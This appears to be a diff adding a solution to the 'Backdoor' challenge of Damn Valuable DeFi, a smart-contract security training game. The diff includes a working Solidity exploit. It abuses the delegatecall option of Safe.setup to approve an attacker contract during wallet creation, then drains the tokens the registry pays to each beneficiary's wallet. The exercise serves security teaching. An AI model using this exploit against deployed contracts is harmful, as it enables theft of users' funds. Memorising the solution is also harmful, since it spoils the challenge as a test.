@@ -5,6 +5,7 @@ pragma solidity =0.8.25;
 import {Test, console} from "forge-std/Test.sol";
 import {Safe} from "@safe-global/safe-smart-account/contracts/Safe.sol";
 import {SafeProxyFactory} from "@safe-global/safe-smart-account/contracts/proxies/SafeProxyFactory.sol";
+import {SafeProxy} from "@safe-global/safe-smart-account/contracts/proxies/SafeProxy.sol";
 import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
 import {WalletRegistry} from "../../src/backdoor/WalletRegistry.sol";
 
@@ -70,7 +71,33 @@ contract BackdoorChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_backdoor() public checkSolvedByPlayer {
-        
+        /**
+         * VULNERABILITY EXPLANATION:
+         * Safe.setup() allows executing a delegatecall to any address during wallet initialization
+         * via the `to` and `data` parameters. The WalletRegistry doesn't validate these parameters.
+         *
+         * The delegatecall runs in the context of the new wallet, so we can:
+         * 1. Create a helper contract that approves tokens for our attacker
+         * 2. During wallet setup, delegatecall to the helper to approve our attacker
+         * 3. Registry validates wallet and transfers 10 DVT to it
+         * 4. Our attacker can immediately transferFrom the DVT since it was pre-approved
+         *
+         * EXPLOIT STRATEGY:
+         * 1. Deploy attacker contract
+         * 2. For each beneficiary, create Safe wallet with malicious setup data
+         * 3. The setup delegatecalls to approve attacker for token spending
+         * 4. Registry sends tokens to wallet, attacker drains them to recovery
+         */
+
+        // Deploy the attacker which handles everything
+        new BackdoorAttacker(
+            walletFactory,
+            address(singletonCopy),
+            walletRegistry,
+            token,
+            users,
+            recovery
+        );
     }
 
     /**
@@ -92,5 +119,73 @@ contract BackdoorChallenge is Test {
 
         // Recovery account must own all tokens
         assertEq(token.balanceOf(recovery), AMOUNT_TOKENS_DISTRIBUTED);
+    }
+}
+
+/**
+ * @notice Helper contract called via delegatecall during Safe setup to approve tokens
+ */
+contract TokenApprover {
+    function approve(address token, address spender, uint256 amount) external {
+        DamnValuableToken(token).approve(spender, amount);
+    }
+}
+
+/**
+ * @notice Attacker contract that creates backdoored Safe wallets for all beneficiaries
+ */
+contract BackdoorAttacker {
+    constructor(
+        SafeProxyFactory walletFactory,
+        address singletonCopy,
+        WalletRegistry walletRegistry,
+        DamnValuableToken token,
+        address[] memory beneficiaries,
+        address recovery
+    ) {
+        // Deploy the helper that will be delegatecalled during setup
+        TokenApprover approver = new TokenApprover();
+
+        // For each beneficiary, create a backdoored wallet
+        for (uint256 i = 0; i < beneficiaries.length; i++) {
+            address beneficiary = beneficiaries[i];
+
+            // Build the owners array (single owner as required)
+            address[] memory owners = new address[](1);
+            owners[0] = beneficiary;
+
+            // Build the malicious setup data that will approve this contract
+            bytes memory approveData = abi.encodeCall(
+                TokenApprover.approve,
+                (address(token), address(this), type(uint256).max)
+            );
+
+            // Encode the full Safe.setup call
+            bytes memory initializer = abi.encodeCall(
+                Safe.setup,
+                (
+                    owners,            // _owners
+                    1,                 // _threshold
+                    address(approver), // to - delegatecall target
+                    approveData,       // data - delegatecall data
+                    address(0),        // fallbackHandler - must be 0
+                    address(0),        // paymentToken
+                    0,                 // payment
+                    payable(address(0)) // paymentReceiver
+                )
+            );
+
+            // Create the proxy with callback to registry
+            SafeProxy proxy = walletFactory.createProxyWithCallback(
+                singletonCopy,
+                initializer,
+                0,  // saltNonce
+                walletRegistry
+            );
+
+            // At this point, the wallet has approved us and has 10 DVT
+            // Transfer tokens to recovery
+            token.transferFrom(address(proxy), recovery, 10e18);
+        }
     }
 }
